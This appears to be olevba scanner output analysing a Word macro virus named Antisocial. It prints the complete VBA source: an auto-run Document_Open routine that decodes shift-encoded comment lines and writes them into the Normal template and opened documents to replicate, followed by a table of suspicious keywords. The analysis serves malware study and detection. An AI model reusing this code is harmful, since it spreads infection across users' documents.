olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial-aaf6f045b88753b96711e7e31dc1d8975f060e97
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial-aaf6f045b88753b96711e7e31dc1d8975f060e97 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
If MacroContainer.FullName = ActiveDocument.FullName Then GoTo ADD Else GoTo NDD
NDD: For d = 11 To NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - f: C$ = C$ & Chr(B$): Next X: A = C$
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End
ADD: For d = 11 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - f: C$ = C$ & Chr(B$): Next X: A = C$
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End Sub
'8Xzq~i|m([}j(Lwk}umv|gKtw{m01B(Wx|qwv{6[i~mVwzuitXzwux|(E(8
'7Vw{pvuz5JvumpytJvu}lyzpvuz'D'7A'Vw{pvuz5]py|zWyv{lj{pvu'D'7
'1Tfu!DN!>!NbdspDpoubjofs/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf
'8[m|(IL(E(Ik|q~mLwk}umv|6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tm
'3Vhw#QW#@#QrupdoWhpsodwh1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh
'5Ktw%i%B%66%Yt%HR3HtzsyTkQnsjx?%H)%B%''?%N%B%-HR3Qnsjx-i1%6..
'7m'D'Pu{/Yuk'1'?0'2'8A'Mvy'_'D'8'[v'Slu/P0A'I+'D'Hzj/Tpk/P3'_3'800'2'mA'J+'D'J+'-'Joy/I+0A'Ul{'_A'H'D'J+
'1NbdspDpoubjofs/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/SfqmbdfMjof!e-!#(#!'!g!'!B;!Ofyu!e
'5RH%B%HR3Qnsjx-61%HR3HtzsyTkQnsjx.
'4EH2HipixiPmriw$50$EH2GsyrxSjPmriw>$EH2EhhJvsqWxvmrk$QG
'3QW1GhohwhOlqhv#4/#QW1FrxqwRiOlqhv=#QW1DggIurpVwulqj#PF
'5Fhyn{jIthzrjsy3Xf{jFx%KnqjSfrj?BFhyn{jIthzrjsy3KzqqSfrj?%Jsi%Xzg
'6Vxo|gzk&Y{h&\ok}\HIujk./@&Ktj&Y{h
'3Sulydwh#Vxe#WrrovPdfur+,=#Hqg#Vxe
'3*^Vdvfkl£Zx£Ol`£E|#O|v£NrylfN
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
